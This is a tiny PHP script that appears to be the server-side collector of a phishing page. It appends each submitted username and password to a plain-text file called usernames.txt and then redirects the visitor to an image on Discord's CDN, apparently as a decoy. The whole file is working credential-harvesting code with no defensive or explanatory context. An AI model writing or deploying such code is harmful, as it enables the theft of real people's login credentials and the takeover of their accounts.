<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://cdn.discordapp.com/attachments/748753299112722432/752307344968515694/5c3b5fdbf8339e233677cdd594ab2801.jpg');
exit();
